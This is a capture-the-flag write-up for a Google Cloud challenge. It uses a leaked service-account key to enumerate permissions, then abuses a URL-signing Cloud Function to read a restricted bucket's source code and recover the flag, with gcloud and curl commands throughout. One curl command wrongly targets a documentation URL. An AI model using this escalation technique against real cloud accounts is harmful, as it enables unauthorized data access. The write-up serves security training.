**video solution:** https://youtu.be/PTfQuA4qTEA

# Writeup

How do you do this challenge, good question. So we are provided with a URL to an App Engine instance (denoted byt the appspot.com URL) which when we navigate to it it says all we need to do is put in the password and we will get the flag.

There seems to be a delay in the processing so brute forcing is not an option and also not smart.

So we need to find the right password to put in here

We also are provided a service account key namely `cory.json` as noted from the challenge description we need to enumerate what this service account can do. 


## Enumeration
Firstly we need to load it into our gcloud configuration (and prior to that install gcloud) we do this through `gcloud auth activate-service-account --key-file cory.json`.

Looking at the key we see that the project id is `at-your-service` but thats about all that we get. We need to enumerate what permissions this service account has. We can use [this handy script](https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum) from [this article](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/) created by GitLAB which enumerates all GCP resources and outputs the data to a json file.

Running this with our gcloud configuration set up we get the following output
```
➜  solution git:(at-your-service) ✗ ./gcp_enum.sh
[*] Created folder 'out-gcp-enum-2020-09-09-06-07-13' for output
[*] Analyzing gcloud configuration
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
[*] Scraping metadata server
  [!] FAIL
[*] Exporting detailed compute instance info
  [!] FAIL
[*] Exporting detailed firewall info
  [!] FAIL
[*] Exporting detailed subnets info
  [!] FAIL
[*] Exporting detailed service account info
  [!] FAIL
[*] Exporting detailed service account key info
<snip></snip>
[*] Exporting detailed available project info
  [!] FAIL
[*] Exporting detailed instance template info
  [!] FAIL
[*] Exporting detailed custom image info
  [!] FAIL
[*] Exporting detailed Cloud Functions info
  [+] SUCCESS
[*] Exporting detailed Pub/Sub info
  [!] FAIL
[*] Exporting detailed compute backend info
  [!] FAIL
[*] Exporting detailed cloud run info
  [!] FAIL
[*] Exporting detailed AI platform info
  [!] FAIL
  [!] FAIL
[*] Exporting detailed Cloud Source Repository info
  [!] FAIL
  [!] FAIL
[*] Exporting detailed Cloud SQL info
  [!] FAIL
<snip></snip>
[*] Exporting detailed Cloud Bigtable info
  [!] FAIL
[*] Exporting detailed Cloud Filestore info
  [!] FAIL
[*] Exporting Stackdriver logging info
  [!] FAIL
ERROR: (gcloud.logging.logs.list) User [cory-worthington@at-your-service-tf.iam.gserviceaccount.com] does not have permission to access project [at-your-service-tf] (or it may not exist): The caller does not have permission
[+] All done, good luck!
[*] Exporting Kubernetes info
  [!] FAIL
  [+] SUCCESS
[*] Enumerating storage buckets
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
  [+] SUCCESS
[*] Enumerating crypto keys
  [!] FAIL
<snip></snip>
[+] All done, good luck!
```

And looking carefully we can see there are two main successes Cloud Functions and Cloud Storage so let's look into them.

Firstly cloud storage we see with `gsutil ls` there are 5 buckets with lots of referennces to app engine and inspecting the contents with `gsutil ls gs://<bucketName>` we see that most either dont have anything or have image files for app engine which could be useful. However the bucket `app-engine-src` contains the actual source files of the instance, lets get those and we should be good!

`gsutil cp gs://app-engine-src/index.js .`

`AccessDeniedException: 403 HttpError accessing`

Oh no we dont have permission to actually read the files :/ looks like we need to find another way. We also saw that we have permissions for cloud functions lets check those out with

`gcloud functions list`

We see there is a cloud function with the name professional-signer, we can get a bit more information about it with `gcloud functions describe professional-signer --region australia-southeast1` (make sure you put the region as gcloud defaults to us-central1)

```
availableMemoryMb: 256
buildId: 4256287b-5e66-40a7-ac02-d60365636dca
entryPoint: signURL
httpsTrigger:
  url: https://australia-southeast1-at-your-service-tf.cloudfunctions.net/professional-signer
ingressSettings: ALLOW_ALL
labels:
  deployment-tool: console-cloud
name: projects/at-your-service-tf/locations/australia-southeast1/functions/professional-signer
runtime: nodejs12
serviceAccountEmail: tracy-worker@at-your-service-tf.iam.gserviceaccount.com
sourceUploadUrl: https://storage.googleapis.com/gcf-upload-australia-south-b7a09567-4ad8-4d49-b141-cbaf07855574/80cf4bae-5794-4077-b723-a08524e43001.zip?GoogleAccessId=service-602241179306@gcf-admin-robot.iam.gserviceaccount.com&Expires=1599630954&Signature=rl6Rbss4mW0ya3d6K1PTf3zok784WlbJ5IvBJ5sBCIW4dLnHjOXs1JfQSIIS%2F5Cc0kSXFvcMOWrCq9doBZ1BG%2BzxX8C%2FZrHtwkA%2BhJ8uQdTF%2BzWBzC0OLl%2F2tEJA%2F1ZX7z0%2F0NR1moz0suM5NRVV%2FxG4itpGTatAqW4udksw6xv0GLTHl9zBA65a%2F5O3jQjybJknU7DvyO7MnwKiMpapWHve%2FIubyY2mgyAlHxUgFJ1A7ARBNreHo6lFpotF1KsFg8dQMsGBmn4fZzWFP15ntA4WKbVrvim4Ta4z6d1wa3YmugVHEEoqs9rhrbkvUX3trif3qLk2%2BEFWSGs0Ax%2Bwlw%3D%3D
status: ACTIVE
timeout: 60s
updateTime: '2020-09-09T05:27:04.885Z'
versionId: '2'
```

We get an endpoint for this URL so lets try and access it but we get a 403 :(. however lets try and authenticate using our service account. Using `gcloud auth print-identity-token` we get a JWT which authorises us to call this function. Now setting this JWT token in our Authorization headerin a app such as Postman so:

`Authorization: Bearer <jwttoken>`

We try and hit the endpoint again but bazinga,
```
{
    "message": "Missing query parameters"
}
```

What query parameters do we need?

We need to get the source code to find out, a brute force doesn't help especially when it says parameters.
Let's see if our service account can retrieve the source code from the server. There is no gcloud command for this however there is an API we can directly hit at https://cloud.google.com/functions/docs/reference/rest/v1/projects.locations.functions/generateDownloadUrl

The documentation there points us to calling the API at https://cloudfunctions.googleapis.com/v1/projects/at-your-service/locations/australia-southeast1/functions/professional-signer:generateDownloadUrl and we need to use an oauth token instead of a JWT token, so use `gcloud auth print-access-token` to get this.

so 

```
curl -X POST https://cloud.google.com/functions/docs/reference/rest/v1/projects.locations.functions/generateDownloadUrl -H 'Authorization: Bearer <oauth-token>'
```

This gives us a link to download the source code! Neat!

```
const {Storage} = require('@google-cloud/storage')

const storage = new Storage();

exports.signURL = async (req, res) => {
    
    // Check if parameters exist
    if (!req.query.b || !req.query.o) {
        return res.status(400)
        .json(
            {
                message: "Missing query parameters"
            }
        )
    }

    let bucket = req.query.b;
    let object = req.query.o;

    const options = {
        version: 'v4',
        action: 'read',
        expires: Date.now() + 15 * 60 * 1000, // 15 minutes
      }

    try {
        const [url]  = await storage
        .bucket(bucket)
        .file(object)
        .getSignedUrl(options)


        res.status(200).json(
            {
                message: "Success!",
                signedURL: url
            }
        );
    } catch(e) {
        console.error(e)
        res.status(400).json({
            status: 400,
            message: "Something went wrong, not my problem"
        })
    }
    
  };
  ```

So this source code is really simple it takes two params, `b` and `o` and creates a signedURL for that bucket object respectivly. This means that perhaps we can access the app-engine-src bucket this way instead of directly.
So lets try call this cloud function with `b=app-engine-src` and `o=index.js`

```
curl https://australia-southeast1-at-your-service-tf.cloudfunctions.net/professional-signer?b=app-engine-src-tf&o=index.js -H 'Authorization: Bearer <jwttoken>
```

And we get a signed URL, accessing this we get the source code of the App Engine instance! and here is the important bit

```
if (req.body.password === "https://www.youtube.com/watch?v=lnigc08J6FI") {
    res.status(200).send(process.env.FLAG)
  } else {
    res.status(401).send('Bad password')
  }
```

We get the password needed to get the flag! which is `https://www.youtube.com/watch?v=lnigc08J6FI` going back to the App Engine instance and inputting this password we get the flag:

`DUCTF{and_thats_the_way_its_gonna_be_little_darling_we'll_be_riding_on_the_horses_YEAAAAAAAAAAAAAAAAAAAAYEAAAAAAAAAAAAAAAAAAAAH}`
